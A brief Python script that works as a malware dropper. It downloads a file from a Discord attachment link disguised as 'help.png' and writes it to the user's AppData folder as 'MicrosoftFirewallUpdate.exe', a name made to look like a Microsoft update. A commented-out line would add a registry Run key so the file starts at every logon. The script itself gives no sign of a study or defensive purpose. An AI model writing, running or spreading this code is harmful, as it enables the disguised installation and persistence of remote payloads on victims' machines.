import requests
import os
he = os.getlogin()

url = "https://media.discordapp.net/attachments/1195633491682021487/1197132718438363176/help.png"
r = requests.get(url, allow_redirects=True)
open("C:/Users/"  + he  +  "/AppData/Local/MicrosoftFirewallUpdate.exe", 'wb').write(r.content)
#os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "MicrosoftFirewallUpdate" /t REG_SZ /F /D "C:/Users/"  + he  +  "/AppData/Local/MicrosoftFirewallUpdate.exe"')